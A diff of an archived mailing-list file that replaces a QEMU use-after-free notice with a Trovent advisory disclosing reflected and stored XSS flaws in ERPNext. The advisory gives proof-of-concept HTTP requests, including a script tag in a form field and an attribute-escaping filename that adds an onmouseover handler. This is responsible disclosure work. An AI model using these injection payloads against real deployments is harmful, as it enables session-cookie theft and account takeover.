@@ -1,30 +1,208 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/02/05/2
-Message-ID: <17998445-94on-7r28-s21p-r5p8rp69srn@redhat.com>
-Date: Fri, 5 Feb 2021 12:45:04 +0530 (IST)
-From: P J P <ppandit@...hat.com>
-To: oss security list <oss-security@...ts.openwall.com>
-cc: Cheolwoo Myung <cwmyung@....ac.kr>
-Subject: CVE-2021-3392 QEMU: scsi: mptsas: use-after-free while processing io requests
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/05/11/8
+Message-ID: <RIeuf4HIlGXELthOpSxxJHOq0HyO2lDwZRepEVlTYEZGANTCCc_Rboo7N9-9FAYmIwSbz4mQcR-QRuof5TFBbIWvka7w4RXymoAq3hfrxhM=@trovent.io>
+Date: Tue, 11 May 2021 11:54:08 +0000
+From: Stefan Pietsch <s.pietsch@...vent.io>
+To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>, "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>, "submissions@...ketstormsecurity.com" <submissions@...ketstormsecurity.com>
+Subject: Trovent Security Advisory 2103-02 / Multiple XSS vulnerabilities in ERPNext 13.0.0/12.18.0
 Content-Type: text/plain; charset=utf-8
 
-   Hello,
+# Trovent Security Advisory 2103-02 #
+#####################################
 
-A use-after-free issue was found in the Megaraid emulator of the QEMU. It 
-occurs while processing SCSI i/o requests because in case of an error 
-mptsas_free_request() does not dequeue request object 'req' from a pending 
-requests' queue. Which later gets processed resulting in the said 
-use-after-free issue. A privileged guest user may use this flaw to crash the 
-QEMU process on the host resulting in DoS scenario.
 
-Upstream patch:
----------------
-   -> https://lists.gnu.org/archive/html/qemu-devel/2021-02/msg00488.html
+Multiple XSS vulnerabilities in ERPNext 13.0.0/12.18.0
+######################################################
 
-This issue was reported by Cheolwoo Myung of Seoul National University.
 
-Thank you.
---
-Prasad J Pandit / Red Hat Product Security Team
-8685 545E B54C 486B C6EB 271E E285 8B5A F050 DE8D
+Overview
+########
 
+Advisory ID: TRSA-2103-02
+Advisory version: 1.0
+Advisory status: Public
+Advisory URL: https://trovent.io/security-advisory-2103-02
+Affected product: ERPNext
+Tested versions: 12.18.0 and 13.0.0 beta
+Vendor: Frappé Technologies https://frappe.io
+Credits: Trovent Security GmbH, Nick Decker, Stefan Pietsch
+
+
+Detailed description
+####################
+
+Trovent Security GmbH discovered multiple Cross-Site-Scripting vulnerabilities
+in the current software versions of ERPNext (13.0.0 and 12.18.0).
+An attacker could leverage this attack to steal session cookies,
+install a JavaScript keylogger and more.
+
+
+1. Reflected XSS in _server_messages exception field
+####################################################
+
+When an API call causes an error the server sometimes sends back exception messages
+containing the user input which is not sanitized.
+This creates the possibility of reflected XSS in any API call/server function using "_server_messages".
+This would be hard to exploit because we only found _server_messages exceptions
+in API calls made by the application itself not the user.
+
+Severity: High
+CVSS Score: 7.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:L/A:L)
+CWE ID: 79
+CVE ID: TBD
+
+Proof of concept
+################
+
+Sample request intercepted with Burp to inject JavaScript. Note that the JavaScript
+is injected in "reference_name" to raise an exception:
+
+REQUEST:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+POST /api/method/frappe.desk.form.utils.add_comment HTTP/1.1
+Host: sqlprodtest.local:1080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Frappe-CSRF-Token: e6532d5e7bef6360c9646d58e0940e8004820db8704ab3dad1d2d875
+X-Frappe-CMD:
+X-Requested-With: XMLHttpRequest
+Content-Length: 157
+Origin: http://sqlprodtest.local:1080
+Connection: close
+Referer: http://sqlprodtest.local:1080/desk
+Cookie: sid=0dfe3b41ff7d0a368a4f28cea4f45ce41b2eadec833c5bc42105355e; system_user=yes; full_name=Administrator; user_id=Administrator; user_image=; io=Ly9MpKRfK_nrKpurAAAN
+
+reference_doctype=User&reference_name=%3cscript%3ealert(1)%3c%2fscript%3e&content=xsstest&comment_email=Administrator
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+RESPONSE (removed the Stack Trace for better readability):
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+HTTP/1.1 417 EXPECTATION FAILED
+Server: nginx/1.19.7
+Date: Thu, 11 Mar 2021 14:23:05 GMT
+Content-Type: application/json
+Content-Length: 1894
+Connection: close
+Set-Cookie: sid=0dfe3b41ff7d0a368a4f28cea4f45ce41b2eadec833c5bc42105355e; Expires=Sun, 14-Mar-2021 14:23:05 GMT; Path=/
+Set-Cookie: system_user=yes; Path=/
+Set-Cookie: full_name=Administrator; Path=/
+Set-Cookie: user_id=Administrator; Path=/
+Set-Cookie: user_image=; Path=/
+
+{"exc_type":"LinkValidationError","exc":"[\"Traceback (...)]","_server_messages":"[\"{\\\"message\\\": \\\"Could not find Reference Name: <script>alert(1)</script>\\\", \\\"indicator\\\": \\\"red\\\", \\\"raise_exception\\\": 1}\"]"}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+2. Stored XSS everywhere where user input is stored inside of HTML tags
+#######################################################################
+
+The application does not sanitize escaped quotation marks (\").
+This can be abused to escape the HTML attribute the input is stored in.
+That allows the user to add new attributes like event handlers
+and thus leading to stored XSS.
+Our testing concluded that this issue is present in the entire application
+the only requirement is that the input is being reflected
+inside of an HTML tag not between them. It also can't be a linking
+attribute like "href" because inside of them user input is escaped.
+For example in combination with HTML injection through a comment,
+a malicious user is able to modify his profile to steal cookies
+from every user including administrators that view his profile.
+
+Severity: High
+CVSS Score: 8.2 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:L)
+CWE ID: 79
+CVE ID: TBD
+
+Proof of concept
+################
+
+Sample request where the file name contains the XSS code with the escaped quotation marks:
+
+REQUEST:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+POST /api/method/upload_file HTTP/1.1
+Host: sqlprodtest.local:1080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Frappe-CSRF-Token: e6532d5e7bef6360c9646d58e0940e8004820db8704ab3dad1d2d875
+Content-Type: multipart/form-data; boundary=---------------------------173872902410009950314171894076
+Content-Length: 74566
+Origin: http://sqlprodtest.local:1080
+Connection: close
+Referer: http://sqlprodtest.local:1080/desk
+Cookie: sid=0dfe3b41ff7d0a368a4f28cea4f45ce41b2eadec833c5bc42105355e; system_user=yes; full_name=Administrator; user_id=Administrator; user_image=; io=o0Bglip9YmrzxZj9AAAX
+
+------------------------------173872902410009950314171894076
+Content-Disposition: form-data; name="file"; filename="user-enum.png\" onmouseover=\"alert(1234)\""
+Content-Type: image/png
+
+PNG
+(...)
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+HTML code snippet from erpnext-server.com/desk#List/File/Home.
+The user is able to escape the context of the title attribute and
+add an onmouseover event which triggers the JavaScript:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+<div class="level list-row small">
+<div class="level-left ellipsis">
+
+<div class="list-row-col ellipsis list-subject level">
+<input class="level-item list-row-checkbox hidden-xs" type="checkbox" data-name="a5ff65f666">
+<span class="level-item  ellipsis" title="user-enum.png" onmouseover="alert(1234)" "="">
+<a class="ellipsis" href="#Form/File/a5ff65f666" title="user-enum.png" onmouseover="alert(1234)" "="">
+
+<i class="octicon octicon-file-text text-muted" style="width: 16px;"></i>
+<span>user-enum.png" onmouseover="alert(1234)"</span>
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Solution / Workaround
+#####################
+
+To mitigate this vulnerability, we recommend to always escape quotation marks.
+
+
+History
+#######
+
+2021-03-08: Vulnerability found
+2021-03-12: Advisory created and vendor contacted
+2021-03-22: Vendor replied that they request CVE IDs after a fix is released
+2021-04-19: Vendor informed about planned disclosure date (2021-05-11)
+2021-05-03: Vendor contacted, asking for status
+2021-05-07: No reply from vendor, vendor contacted again
+2021-05-11: Advisory published
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (856 bytes)
